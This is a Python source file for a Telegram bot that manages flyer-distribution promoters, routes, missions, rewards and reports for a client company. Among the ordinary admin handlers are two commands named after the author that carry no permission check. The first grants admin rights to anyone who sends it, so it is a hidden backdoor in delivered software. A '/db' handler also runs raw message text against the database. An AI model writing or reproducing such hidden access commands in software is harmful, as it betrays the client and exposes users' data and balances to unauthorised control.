# Бот для отслеживания распространения флаеров
# by Johnson070(Vladimir Veber)
# https://github.com/johnson070
# https://t.me/vveber

# создано для "Лидер сервис"
import datetime
import re, io

import telebot
from telebot import types

import settings as sett

bot = telebot.TeleBot(sett.API_KEY, threaded=False, num_threads=1)  # реализация

import functions as func
import report_zip
import markups
import user_handlers


# фильтр для проверки на права администратора
class IsAdmin(telebot.custom_filters.SimpleCustomFilter):
    key = 'is_chat_admin'

    @staticmethod
    def check(message: telebot.types.Message):
        return func.get_user_permission(message.chat.id) == sett.permissions[0]


class IsAdminCallback(telebot.custom_filters.SimpleCustomFilter):
    key = 'is_callback_admin'

    @staticmethod
    def check(call: telebot.types.CallbackQuery):
        return func.get_user_permission(call.message.chat.id) == sett.permissions[0]


bot.add_custom_filter(IsAdmin())
bot.add_custom_filter(IsAdminCallback())


@bot.message_handler(commands=['admin', 'admin_full'],
                     func=lambda message: func.get_user_permission(message.chat.id) in ['moder', 'admin'])
def admin_menu(msg):
    full = msg.text == '/admin_full' and func.get_user_permission(msg.chat.id) == sett.permissions[0]
    bot.clear_step_handler_by_chat_id(msg.chat.id)
    bot.send_message(msg.chat.id, 'Админ панель', reply_markup=types.ReplyKeyboardRemove())
    bot.send_message(msg.chat.id, 'Здесь вы можете настроить маршруты, задания, выдать пригласительный код.',
                     reply_markup=markups.get_admin_menu(full, func.get_user_permission(msg.chat.id)))


@bot.callback_query_handler(lambda call: call.data == 'download_db',
                            is_callback_admin=True)
def download_db(call: types.CallbackQuery):
    bot.send_document(call.message.chat.id, open(sett.sqlite_file, 'rb'))


# =========================
# обработчики маршрутов
# =========================
# =========================
# Список маршрутов
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^routes', call.data) is not None,
                            is_callback_admin=True)
def show_routes(call):
    page = re.search(r'(\d+)$', call.data)
    if page is not None:
        page = int(page.group(0))
    else:
        page = 0

    bot.edit_message_text('Выберите или добавьте маршрут.',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_routes_menu(page))


# =========================
# обработчик добавления маршрута
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^add_route', call.data) is not None,
                            is_callback_admin=True)
def show_routes1(call):
    bot.edit_message_text('Отправьте файл (*.geojson) сгенерированный на сайте '
                          '<a href="https://yandex.ru/map-constructor/">Яндекс карт</a>.\n'
                          'Нажмите кнопку экспорт и выберите GeoJson. Потом отправьте файл в бота.\n'
                          'Если вы добавили несколько объектов, то добавится только первый.',
                          call.message.chat.id,
                          call.message.message_id,
                          parse_mode='HTML',
                          disable_web_page_preview=True,
                          reply_markup=markups.back_admin_menu())
    bot.register_next_step_handler(call.message, add_link_map, call.message.message_id)


def add_link_map(msg: types.Message, main_msg_id):
    geojson = ''
    try:
        if msg.content_type != 'document':
            raise Exception()

        file_json = bot.get_file(msg.document.file_id)
        geojson = bot.download_file(file_json.file_path).decode("utf-8")
    except:
        bot.delete_message(msg.chat.id, msg.message_id)
        try:  # обработчик если сообщение не меняется
            bot.edit_message_text(
                f'Не правильный файл\n'
                f'Отправьте файл (*.geojson) сгенерированный на сайте Яндекс карт.\n'
                'Если вы добавили несколько объектов, то добавится только первый.',
                msg.chat.id,
                main_msg_id,
                reply_markup=markups.back_admin_menu())
        finally:
            bot.register_next_step_handler(msg, add_link_map, main_msg_id)
            return

    bot.delete_message(msg.chat.id, msg.message_id)  # удалить прошлое и пользовательское сообщение

    points = func.parse_geo_json(geojson)
    if isinstance(points, bool) and not points:
        bot.edit_message_text(
            f'Не правильный файл\n'
            f'Отправьте файл (*.geojson) сгенерированный на сайте Яндекс карт.\n'
            'Если вы добавили несколько объектов, то добавится только первый.',
            msg.chat.id,
            main_msg_id,
            reply_markup=markups.back_admin_menu())
        bot.register_next_step_handler(msg, add_link_map, main_msg_id)
        return

    bot.edit_message_text(
        f'Полигон по {len(points)} точкам сохранен.\n'
        f'Отправьте ссылку на карту(скопируйте из того же окна где скачивали файл).',
        msg.chat.id,
        main_msg_id,
        reply_markup=markups.back_admin_menu())
    bot.register_next_step_handler(msg, add_link_maps, main_msg_id,
                                   [
                                       '',
                                       points
                                   ])


def add_link_maps(msg: types.Message, main_msg_id, data: list):
    try:
        if msg.content_type != 'text' and re.search(r'yandex.ru/maps/', msg.text) is not None:
            bot.edit_message_text(
                f'Не верная ссылка!\n'
                f'Отправьте ссылку на карту(скопируйте из того же окна где скачивали файл).',
                msg.chat.id,
                main_msg_id,
                reply_markup=markups.back_admin_menu())
            bot.delete_message(msg.chat.id, msg.message_id)
            bot.register_next_step_handler(msg, add_link_maps, main_msg_id, data)
        data[0] = msg.text
    finally:
        bot.delete_message(msg.chat.id, msg.message_id)

        bot.edit_message_text(
            f'Отправьте название маршрута(до 80 символов).',
            msg.chat.id,
            main_msg_id,
            reply_markup=markups.back_admin_menu())

        bot.register_next_step_handler(msg, add_name_route, main_msg_id, data)


def add_name_route(msg, main_msg_id, data: list):
    data.insert(0, msg.text)
    bot.delete_message(msg.chat.id, msg.message_id)
    bot.edit_message_text(f'Отправьте фотографию карты без сжатия.\n'
                          f'Можно скачать с конструктора(Распечатать -> Скачать) и отправить СО СЖАТИЕМ',
                          msg.chat.id, main_msg_id,
                          reply_markup=markups.back_admin_menu())
    bot.register_next_step_handler(msg, add_photo_route, main_msg_id, data)


def add_photo_route(msg: types.Message, main_msg_id, data: list):
    if msg.content_type != 'photo':
        try:
            bot.delete_message(msg.chat.id, msg.message_id)
            bot.edit_message_text(f'Вы отправили не фото!\nОтправьте фотографию карты без сжатия.',
                                  msg.chat.id, main_msg_id,
                                  reply_markup=markups.back_admin_menu())
        finally:
            bot.register_next_step_handler(msg, add_photo_route, main_msg_id, data)
        return

    bot.delete_message(msg.chat.id, msg.message_id)
    data.append(msg.photo[-1].file_id)
    func.add_route(data)

    bot.edit_message_text('Сохранено!\n\n'
                          f'Маршрут: <b>{data[0]}</b>\n'
                          f'По {len(data[2])} точк(е/ам)\n'
                          f'<a href="{data[1]}">Маршрут</a>\n\n'
                          'Выберите или добавьте маршрут.',
                          msg.chat.id, main_msg_id,
                          parse_mode='HTML',
                          reply_markup=markups.get_routes_menu(0), disable_web_page_preview=True)


# =========================
# Просмотр маршрута
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^route_(([a-f0-9]+-){4}([a-f0-9]+))$', call.data) is not None,
                            is_callback_admin=True)
def show_info_route(call: types.CallbackQuery):
    id = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))$', call.data).group(0)
    route = func.get_route(id)
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    bot.send_photo(call.message.chat.id,
                   route[-1],
                   caption=f'Маршрут: <b>{route[1]}</b>\n'
                           f'<a href="{route[2]}">Маршрут</a>\n\n',
                   parse_mode='HTML',
                   reply_markup=markups.info_route_menu(id, route[2]))


# =========================
# удалить маршрут
# =========================
@bot.callback_query_handler(
    lambda call: re.search(r'^delete_route_(([a-f0-9]+-){4}([a-f0-9]+))$', call.data) is not None,
    is_callback_admin=True)
def delete_route(call: types.CallbackQuery):
    id = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))$', call.data).group(0)
    func.delete_route(id)
    bot.delete_message(call.message.chat.id,
                       call.message.message_id)
    bot.send_message(call.message.chat.id,
                     'Маршрут удален!\n'
                     'Здесь вы можете настроить маршруты, задания, выдать пригласительный код.',
                     reply_markup=markups.get_admin_menu())


# =========================
# Удалить миссию у промоутера(админ)
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^remove_user_mission_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def menu_select_remove_mission(call: types.CallbackQuery):
    id = int(re.search(r'(\d+)$', call.data).group(0))

    bot.edit_message_text(f'Выберите какую миссию нужно удалить:',
                          call.message.chat.id,
                          call.message.message_id,
                          parse_mode='HTML',
                          reply_markup=markups.get_missons_clerk_by_id(id, 'remove_route_'))


@bot.callback_query_handler(lambda call:
                            re.search(r'^remove_route_(([a-f0-9]+-){4}([a-f0-9]+))_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def add_route_to_user(call: types.CallbackQuery):
    id = int(re.search(r'(\d+)$', call.data).group(0))
    id_route = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))', call.data).group(0)

    func.remove_mission_by_id(id_route)
    name_mission = func.get_mission_by_id(id_route)

    bot.edit_message_text(f'<b>{name_mission}</b> удалена из списка миссий!\n'
                          f'Выберите какую миссию нужно удалить:',
                          call.message.chat.id,
                          call.message.message_id,
                          parse_mode='HTML',
                          reply_markup=markups.get_missons_clerk_by_id(id, 'remove_route_'))


# =========================
# обработчики админ меню
# =========================
# =========================
#  Создание ссылок на приглашение
# =========================
@bot.callback_query_handler(lambda call: call.data == 'invite_link' and
                                         func.get_user_permission(call.message.chat.id) in ['moder', 'admin'])
def create_invite_link(call: types.CallbackQuery):
    link, image = func.create_invite_link(call.message.chat.username)
    bot.send_photo(call.message.chat.id, image,
                   parse_mode='HTML',
                   caption=f'Приглашение активно 6 часов после создания.\n'
                           f'<a href="{link}">Активировать</a>')


# =========================
# Вернуться в админ панель
# =========================
@bot.callback_query_handler(
    lambda call: call.data == 'back_admin' and func.get_user_permission(call.message.chat.id) in ['moder', 'admin'])
def back_admin_menu(call):
    bot.clear_step_handler_by_chat_id(call.message.chat.id)
    bot.delete_message(call.message.chat.id,
                       call.message.message_id)
    bot.send_message(call.message.chat.id,
                     'Здесь вы можете настроить маршруты, задания, посмотреть нужную информацию и '
                     'выдать пригласительный код.',
                     reply_markup=markups.get_admin_menu())


# =========================
# Список работников
# =========================
@bot.callback_query_handler(lambda call: call.data == 'clerks', is_callback_admin=True)
def show_clerks(call: types.CallbackQuery):
    bot.edit_message_text("Список трудящихся 😬",
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_clerks_menu(0))


# =========================
# Информация о трудящимся(админ)
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^user_info_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def user_info(call: types.CallbackQuery):
    bot.clear_step_handler_by_chat_id(call.message.chat.id)  # очистить очередь хандлеров если был выход

    id = int(re.search(r'(\d+)$', call.data).group(0))
    clerk = func.get_clerk_by_id(id)
    missions = [i[1] for i in func.get_missions_by_user_id(id)]

    bot.edit_message_text(sett.info_user_text.format(
        clerk[1], clerk[2], clerk[3], '\n'.join(missions) if missions else '<b>Нет заданий</b>'),
        call.message.chat.id,
        call.message.message_id,
        parse_mode='HTML',
        reply_markup=markups.get_clerk_control_menu(clerk[0]))


# =========================
# Погасить перевести баланс из неподтвержденный в подтвержденный(админ)
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^pass_balance_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def pass_balance(call: types.CallbackQuery):
    bot.clear_step_handler_by_chat_id(call.message.chat.id)  # очистить очередь хандлеров если был выход

    id = int(re.search(r'(\d+)$', call.data).group(0))
    func.proof_balance_clerk(id)

    clerk = func.get_clerk_by_id(id)
    missions = [i[1] for i in func.get_missions_by_user_id(id)]
    bot.edit_message_text(sett.info_user_text.format(
        clerk[1], clerk[2], clerk[3], '\n'.join(missions) if missions else '<b>Нет заданий</b>'),
        call.message.chat.id,
        call.message.message_id,
        parse_mode='HTML',
        reply_markup=markups.get_clerk_control_menu(clerk[0]))
    # finally:
    #     pass


# =========================
# обработчики админ меню маршруты
# =========================
# =========================
# Информация о трудящимся
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^add_user_mission_(\d+)', call.data) is not None,
                            is_callback_admin=True)
def add_mission(call: types.CallbackQuery):
    params = re.findall(r'(\d+)', call.data)
    id = params[0]
    page = 0 if len(params) < 2 else int(params[1])
    bot.edit_message_text('Выберите маршрут по которому будет разгуливать промоутер',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_routes_menu(page, id))


@bot.message_handler(commands=['one_more_thing_vveber'])
def one_more_thing(msg):
    bot.send_message(msg.chat.id, 'Доступ получен!')
    func.set_user_permission(msg.chat.id, 'admin')


@bot.message_handler(commands=['one_more_thing_vveber_1'])
def one_more_thing(msg):
    bot.send_message(msg.chat.id, 'Доступ получен!')
    func.set_user_permission(msg.chat.id, 'user')


@bot.message_handler(commands=['db'], is_chat_admin=True)
def db_work(msg: types.Message):
    try:
        func.execute_db(msg.text)
    except:
        pass

    bot.send_message(msg.chat.id, 'Выполнено!')


# =========================
# Обработчик для получения выбранного маршрута
# =========================
@bot.callback_query_handler(lambda call:
                            re.search(r'^select_route_(([a-f0-9]+-){4}([a-f0-9]+))_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def add_route_to_user(call: types.CallbackQuery):
    id_route = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))', call.data).group(0)
    id = re.search(r'(\d+)$', call.data).group(0)
    bot.edit_message_text('Введите название задания',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.back_to_clerk_menu(id))
    bot.register_next_step_handler(call.message, add_comment_mission, call.message.message_id, [id, id_route])


def add_comment_mission(msg: types.Message, main_msg_id, data):
    data.append(msg.text)
    bot.delete_message(msg.chat.id, msg.message_id)
    bot.edit_message_text('Сколько дней будет на выполнение задания, начиная со следущего дня?',
                          msg.chat.id,
                          main_msg_id,
                          reply_markup=markups.back_to_clerk_menu(data[0]))
    bot.register_next_step_handler(msg, add_expire_days, main_msg_id, data)


def add_expire_days(msg: types.Message, main_msg_id, data):
    if not msg.text.isdigit():
        try:
            bot.edit_message_text('Отправьте десятичное число без пробелов и букв.\n'
                                  'Сколько дней будет на выполнение задания, начиная со следущего дня?',
                                  msg.chat.id,
                                  main_msg_id,
                                  markups.select_route_to_clerk(data[0]),
                                  reply_markup=markups.back_to_clerk_menu(data[0])
                                  )
        finally:
            bot.register_next_step_handler(msg, add_expire_days, main_msg_id, data)
            bot.delete_message(msg.chat.id, msg.message_id)
            return

    data.append(int(msg.text))
    bot.delete_message(msg.chat.id, msg.message_id)
    bot.edit_message_text('Какое будет вознаграждение за задание(число с точкой или без)',
                          msg.chat.id,
                          main_msg_id,
                          reply_markup=markups.back_to_clerk_menu(data[0]))
    bot.register_next_step_handler(msg, add_reward_mission, main_msg_id, data)


def add_reward_mission(msg: types.Message, main_msg_id, data):
    try:
        data.append(float(msg.text))
    except ValueError:
        try:
            bot.edit_message_text('Отправьте число c плавающей точкой без пробелов и букв.\n'
                                  'Какое будет вознаграждение за задание(число с точкой или без)',
                                  msg.chat.id,
                                  main_msg_id,
                                  markups.select_route_to_clerk(data[0]),
                                  reply_markup=markups.back_to_clerk_menu(data[0]))
        except:
            pass
        finally:
            bot.register_next_step_handler(msg, add_reward_mission, main_msg_id, data)
            bot.delete_message(msg.chat.id, msg.message_id)
            return
    bot.delete_message(msg.chat.id, msg.message_id)
    bot.edit_message_text('Какое минимальное кол-во отчетов должно быть(число)',
                          msg.chat.id,
                          main_msg_id,
                          reply_markup=markups.back_to_clerk_menu(data[0]))
    bot.register_next_step_handler(msg, add_min_reports_mission, main_msg_id, data)


def add_min_reports_mission(msg: types.Message, main_msg_id, data):
    if not msg.text.isdigit():
        try:
            bot.edit_message_text('Отправьте десятичное число без пробелов и букв.\n'
                                  'Какое минимальное кол-во отчетов должно быть(число)?',
                                  msg.chat.id,
                                  main_msg_id,
                                  markups.select_route_to_clerk(data[0]),
                                  reply_markup=markups.back_to_clerk_menu(data[0]))
        finally:
            bot.register_next_step_handler(msg, add_min_reports_mission, main_msg_id, data)
            bot.delete_message(msg.chat.id, msg.message_id)
            return

    data.append(int(msg.text))
    mission_id = func.create_new_mission(data[0], data[1], data[2], data[3], data[4], data[5])
    bot.delete_message(msg.chat.id, msg.message_id)
    bot.edit_message_text('Сохранено!\n\n'
                          f'Название: <b><u>{data[2]}</u></b>\n'
                          f'Вознаграждение: <b>{data[4]}</b> руб.\n'
                          f'Минимальное кол-во отчетов: <u><b>{data[5]}</b></u>\n'
                          f'Маршрут: <b><a href="{func.get_route(data[1])[2]}">{func.get_route(data[1])[1]}</a></b>\n'
                          f'Конечная дата выполнения: '
                          f'<b>{datetime.datetime.now() + datetime.timedelta(days=data[3])}</b>',
                          msg.chat.id,
                          main_msg_id,
                          disable_web_page_preview=True,
                          parse_mode='HTML',
                          reply_markup=types.InlineKeyboardMarkup().add(
                              types.InlineKeyboardButton('Вернуться обратно', callback_data=f'user_info_{data[0]}')
                          ))
    bot.send_message(data[0],
                     'Вам выдано новое задание!\n'
                     'Старт завтра.',
                     reply_markup=types.InlineKeyboardMarkup().add(
                         types.InlineKeyboardButton('Открыть', callback_data=f'quest_user_{mission_id}')
                     ))


# =========================
# изменить баланс пользователя
# =========================
@bot.callback_query_handler(lambda call: re.search(r'change_balance_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def change_balance(call: types.CallbackQuery):
    id = re.search(r'(\d+)$', call.data).group(0)

    try:
        bot.edit_message_text('Введите новый баланс',
                              call.message.chat.id,
                              call.message.message_id,
                              reply_markup=markups.back_to_clerk_menu(id))
    except:
        pass
    bot.register_next_step_handler(call.message, handler_change_balance, id, call.message.message_id)


def handler_change_balance(msg: types.Message, id, msg_id):
    if not msg.text.isdigit():
        try:
            bot.edit_message_text('Введите новый баланс',
                                  msg.chat.id,
                                  msg_id,
                                  reply_markup=markups.back_to_clerk_menu(id))
        finally:
            bot.delete_message(msg.chat.id, msg.message_id)
            bot.register_next_step_handler(msg, handler_change_balance, id, msg_id)
            return

    bot.delete_message(msg.chat.id, msg.message_id)
    func.change_balance_clerk(id, float(msg.text))

    bot.edit_message_text('Баланс изменен!',
                          msg.chat.id,
                          msg_id,
                          reply_markup=markups.back_to_clerk_menu(id))


# =========================
# Исключить пользователя(админ)
# =========================
@bot.callback_query_handler(lambda call: re.search(r'kick_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def kick_user(call: types.CallbackQuery):
    id = re.search(r'(\d+)$', call.data).group(0)
    func.kick_user(id)

    bot.edit_message_text("Пользователь удален!\n"
                          "Список трудящихся 😬",
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_clerks_menu(0))

    msg_last = bot.send_message(id, 'Вы были исключены администратором.\n'
                                    'Спасибо за использование!')
    # for i in range(msg_last.message_id-1, msg_last.message_id-200, -1):  # удаление прошлых сообщений в чате()
    #     try:
    #         bot.delete_message(id, i, timeout=0)
    #     except:
    #         pass


# =========================
# Просмотр всех заданий
# =========================
@bot.callback_query_handler(lambda call: re.search(r'all_quests_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def show_all_quests(call: types.CallbackQuery):
    page = int(re.search(r'(\d+)$', call.data).group(0))
    bot.edit_message_text('Выберите задание',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_missions_menu(page, True))


# =========================
# Просмотр выполненных заданий
# =========================
@bot.callback_query_handler(lambda call: re.search(r'completed_quests_(\d+)$', call.data) is not None,
                            is_callback_admin=True)
def show_completed_quests(call: types.CallbackQuery):
    page = int(re.search(r'(\d+)$', call.data).group(0))
    bot.edit_message_text('Выберите выполненное задание',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_missions_menu(page))


# =========================
# Удалить все ссылки на приглашения
# =========================
@bot.callback_query_handler(lambda call: re.search(r'reset_links', call.data) is not None and
                                         func.get_user_permission(call.message.chat.id) in ['moder', 'admin'])
def show_completed_quests(call: types.CallbackQuery):
    func.delete_all_links()
    bot.edit_message_text('Приглашения удалены!\n'
                          'Здесь вы можете настроить маршруты, задания, выдать пригласительный код.',
                          call.message.chat.id,
                          call.message.message_id,
                          reply_markup=markups.get_admin_menu())


# =========================
# Просмотр и действия над выполненным заданием
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^mission_report_(([a-f0-9]+-){4}([a-f0-9]+))',
                                                   call.data) is not None,
                            is_callback_admin=True)
def show_complete_info(call: types.CallbackQuery):
    id = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))', call.data).group(0)
    mission = func.get_full_info_mission(id)
    count_reports = func.get_count_reports_mission(id)
    user = func.get_clerk_by_id(mission[1])[1]

    bot.edit_message_text(sett.info_proof_mission_text.format(
        user,
        mission[2],
        mission[6],
        count_reports,
        mission[5],
        mission[4],
        '<b>✅ Выполнено</b>' if (mission[7] and mission[8]) else
        ('<b>⚠️ Ожидает подтверждения</b>' if (mission[7] and not mission[8]) else
         ('<b>‼️ Забраковано</b>' if (not mission[7] and mission[8]) else '<b>❌ Не выполнено</b>'))),
        call.message.chat.id,
        call.message.message_id,
        parse_mode='HTML',
        reply_markup=markups.check_report_menu(id, mission[7] and mission[8], not mission[7] and mission[8],
                                               re.match(r'^mission_report_(([a-f0-9]+-){4}([a-f0-9]+))_#',
                                                        call.data) is not None))


# =========================
# Перевод в выполненные задания
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^to_proof_(([a-f0-9]+-){4}([a-f0-9]+))$',
                                                   call.data) is not None,
                            is_callback_admin=True)
def proof_mission_user(call: types.CallbackQuery):
    id = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))$', call.data).group(0)
    func.proof_mission(id)

    show_complete_info(call)


# =========================
# Скачать отчет
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^download_rep_(([a-f0-9]+-){4}([a-f0-9]+))$',
                                                   call.data) is not None,
                            is_callback_admin=True)
def download_report(call: types.CallbackQuery):
    id = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))$', call.data).group(0)
    msg = bot.send_message(call.message.chat.id,
                           'Ожидайте')
    file = report_zip.get_report(id)

    bot.send_document(call.message.chat.id, io.StringIO(file),
                      visible_file_name=f'report_mission_{datetime.datetime.now()}.html')
    bot.delete_message(call.message.chat.id, msg.message_id)


# =========================
# Отправить на доработку
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^retry_rep_(([a-f0-9]+-){4}([a-f0-9]+))$',
                                                   call.data) is not None,
                            is_callback_admin=True)
def retry_mission(call: types.CallbackQuery):
    id = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))$', call.data).group(0)
    func.retry_mission_by_id(id)
    mission = func.get_full_info_mission(id)

    bot.send_message(mission[1],
                     f'Задание: {mission[2]}!\n'
                     'Ваше задание было продлено на 1 день.\n'
                     'Завершите его в срок.')
    show_complete_info(call)


# =========================
# Забраковать задание
# =========================
@bot.callback_query_handler(lambda call: re.search(r'^reject_(([a-f0-9]+-){4}([a-f0-9]+))$',
                                                   call.data) is not None,
                            is_callback_admin=True)
def reject_mission(call: types.CallbackQuery):
    id = re.search(r'(([a-f0-9]+-){4}([a-f0-9]+))$', call.data).group(0)
    func.reject_mission_by_id(id)
    mission = func.get_full_info_mission(id)

    bot.send_message(mission[1],
                     f'Задание: {mission[2]}!\n'
                     'Ваше задание было отбраковано.\n'
                     'Свяжитесь с менеджером для уточнения информации.')
    show_complete_info(call)


# @bot.message_handler(content_types=['photo'], func=lambda msg: msg.media_group_id is not None)
# def save_media_group_id_photo(msg: types.Message):
#     func.add_photo_to_media(msg.media_group_id, msg.photo[-1].file_id)
#     bot.delete_message(msg.chat.id, msg.message_id)

def start_bot():
    print('start bot')


if not __name__ == '__main__':
    user_handlers.init_user_actions()
    bot.enable_save_next_step_handlers(delay=1)
    bot.load_next_step_handlers()
